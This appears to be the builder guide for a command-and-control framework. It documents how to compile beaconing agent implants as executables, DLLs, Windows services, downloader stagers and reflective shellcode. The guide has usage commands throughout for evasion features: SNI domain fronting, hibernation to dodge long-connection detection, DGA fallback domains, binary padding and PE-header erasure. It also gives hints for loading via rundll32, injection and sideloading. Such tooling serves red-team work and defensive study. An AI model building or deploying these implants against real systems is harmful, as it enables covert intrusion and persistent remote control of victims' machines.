# Builder Guide

The builder compiles agent binaries with embedded configuration, crypto keys, and malleable profiles.

## Basic Usage

```bash
cargo run --bin builder -- \
  --host 10.0.0.1 \
  --port 4443 \
  --platform linux \
  --transport tls \
  --sleep 30 \
  --jitter-min 10 \
  --jitter-max 20
```

## Flags

### Core

| Flag | Default | Description |
|------|---------|-------------|
| `--host` | `127.0.0.1` | C2 server address |
| `--port` | `4443` | C2 server port (or pipe name for named_pipe) |
| `--platform` | `linux` | Target: `linux`, `windows`, `macos` |
| `--transport` | `tls` | Transport: `tls`, `tcp_plain`, `named_pipe`, `http`, `https` |
| `--format` | `exe` | Output: `exe`, `dll`, `service`, `stager`, `shellcode` |
| `--profile` | `default` | Built-in profile: `default`, `http_post`, `http_image` |
| `--profile-file` | - | Path to custom malleable profile JSON |
| `--fallback-file` | - | Path to fallback endpoints JSON |
| `--sleep` | `40` | Beacon interval in seconds |
| `--jitter-min` | `20` | Minimum jitter percentage |
| `--jitter-max` | `10` | Maximum jitter percentage |
| `--bloat` | `0` | Add N megabytes of padding to increase binary size |
| `--debug` | `false` | Enable debug output on the agent |
| `--days` | `0` | Kill date: agent self-destructs after N days (0 = never) |

### TLS Traffic Shaping

| Flag | Default | Description |
|------|---------|-------------|
| `--sni <hostname>` | *(c2 host)* | SNI hostname advertised in TLS ClientHello. The TCP connection still goes to `--host`; set this to a CDN or cloud hostname to blend with legitimate TLS traffic. |
| `--alpn <protos>` | `http/1.1` | Comma-separated ALPN protocol list, e.g. `h2,http/1.1`. Advertised in TLS ClientHello. Must match what the listener actually speaks - do not advertise `h2` unless the server supports HTTP/2. |

These flags control the TLS ClientHello independently of the actual connection endpoint, enabling domain-fronting-style deployments where the SNI points to a CDN while traffic routes through the same infrastructure.

### Hibernation / Dweller Mode

| Flag | Default | Description |
|------|---------|-------------|
| `--hibernation` | `false` | Enable hibernation mode. The agent connects, claims a batch of queued tasks, executes them, then disconnects and sleeps. No persistent socket is held. |
| `--batch-size <n>` | `1` | Number of tasks to claim per check-in when in hibernation mode. |

Hibernation agents do not maintain a long-lived connection, which avoids long-connection detection signatures. Commands must be pre-queued via `POST /api/hosts/:id/queue` before the agent checks in. See [API Reference](api.md) for the task queue endpoints.

### Domain Generation Algorithm (DGA)

| Flag | Default | Description |
|------|---------|-------------|
| `--dga-seed <u64>` | *(disabled)* | Enable DGA with this seed. When set, the agent generates additional C2 hostnames each time window and appends them as low-priority fallback endpoints. The operator must register the matching domains - computable from the same seed and window. |
| `--dga-window <secs>` | `86400` | Time window length in seconds. The domain set rotates every window. Default is daily. |
| `--dga-count <n>` | `16` | Number of domains to generate per window. |
| `--dga-tlds <list>` | `com,net,org` | Comma-separated TLD list to sample from, e.g. `com,net,io`. |

DGA domains are appended after any statically-configured fallback endpoints (priority ≥ 100) so they only activate when all explicit endpoints are unreachable. The algorithm is deterministic: given the same seed and window index, both the agent and operator compute identical domain lists. See [Fallback & DGA](fallback.md) for full details.

## Output Formats

### EXE (default)
Standard executable. Run directly or via any execution method.

### DLL
Exports `DllMain`. On `DLL_PROCESS_ATTACH`, spawns the agent on a new thread. Use with:
- `rundll32.exe agent.dll,DllMain`
- Reflective DLL injection
- DLL sideloading

### Service
Windows service binary. Register with:
```
sc create RCMAgent binPath= "C:\path\to\service.exe"
sc start RCMAgent
```

### Stager
Minimal downloader (~50KB). Fetches the full agent from `/stage/<build_id>` on the C2 server, writes to temp, executes, cleans up. Good for initial access where payload size matters.

### Shellcode (.bin)
Windows x64 only. Builds the agent DLL, then converts it into position-independent
shellcode using sRDI-style reflective loading:

```
┌─────────────────────┬──────────────────┬─────────────┬───────────┐
│ bootstrap (69 bytes)│ RDI loader stub │ raw DLL │ user data │
└─────────────────────┴──────────────────┴─────────────┴───────────┘
```

At runtime the bootstrap captures RIP, passes the DLL pointer / export hash /
user-data pointer / flags to the embedded loader stub, which maps the DLL in
memory (section copy, base relocations, import resolution via PEB walk + ROR13
hashing) and calls `DllMain(DLL_PROCESS_ATTACH)` - where the RCM agent spawns
its thread. No export call is needed for RCM agents, hence the default hash
`0x10` ("none").

The conversion is byte-for-byte compatible with [sRDI](https://github.com/monoxgas/sRDI)
(BSD 3-Clause, Copyright (c) 2013 Matthew Graeber); the embedded 64-bit loader
stub is sRDI's precompiled `ShellcodeRDI` output. Execute the `.bin` with any
shellcode loader (`VirtualAlloc` + `memcpy` + `CreateThread`, or your injector
of choice - see `extensions/inject_*.rhai`).

Shellcode-specific flags:

| Flag | Default | Description |
|------|---------|-------------|
| `--sc-hash` | `0x10` | ROR13 hash of a DLL export to call after load (hex or decimal). `0x10` = none |
| `--sc-userdata` | `None` | Opaque blob appended after the DLL; pointer+length handed to the loader |
| `--sc-flags` | `0` | Loader flags (bit0: erase PE headers after load, bit1: obfuscate imports) |
| `--sc-output` | `bin` | File encoding: `bin` (raw), `b64`, `c` (C array), `hex` |

```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 \
  --platform windows --transport tls \
  --format shellcode --sc-output bin
# -> dist/shellcode_windows_<id>.bin
```

## Examples

HTTPS agent through corporate proxy with CDN fronting:
```bash
cargo run --bin builder -- \
  --host 203.0.113.5 --port 443 \
  --transport https --platform windows \
  --sni legitimate-cdn.example.com \
  --alpn h2,http/1.1 \
  --profile-file traffic_profiles/slack_api.json \
  --fallback-file fallback_profiles/corporate_proxy.json \
  --sleep 60 --days 30
```

Hibernation agent with task queue:
```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 \
  --transport tls --platform linux \
  --hibernation --batch-size 5 \
  --sleep 120
# Pre-queue commands via API before the agent checks in:
# POST /api/hosts/:id/queue {"command": "whoami"}
```

Agent with DGA fallback (daily rotation, 32 domains/day):
```bash
cargo run --bin builder -- \
  --host primary.example.com --port 4443 \
  --transport tls --platform linux \
  --dga-seed 14831264957 \
  --dga-count 32 \
  --dga-tlds com,net,io \
  --sleep 30
```

Linux EXE with short beacon interval:
```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 \
  --transport tls --platform linux \
  --format exe --sleep 5
```
